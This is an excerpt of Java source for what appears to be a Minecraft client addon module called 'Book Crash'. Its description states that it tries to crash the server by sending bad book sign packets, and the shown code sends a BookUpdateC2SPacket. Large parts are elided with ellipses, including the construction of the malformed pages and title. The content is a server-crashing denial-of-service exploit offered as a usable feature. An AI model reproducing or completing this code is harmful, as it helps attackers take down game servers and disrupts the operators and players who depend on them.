...
public class BookCrash extends Module {
    ...
    public BookCrash() {
        super(RandomAddon.CATEGORYC, "Book Crash", "CRYSTAL || Tries to crash the server by sending bad book sign packets.");
    ...
    private void sendBadBook() {
        ...
        if (Objects.requireNonNull(mode1) != Mode.BookUpdate) {
            ...
            assert mc.player != null;
            Objects.requireNonNull(mc.getNetworkHandler()).sendPacket(new BookUpdateC2SPacket(mc.player.getInventory().selectedSlot, pages, Optional.of(title)));
        }
    }
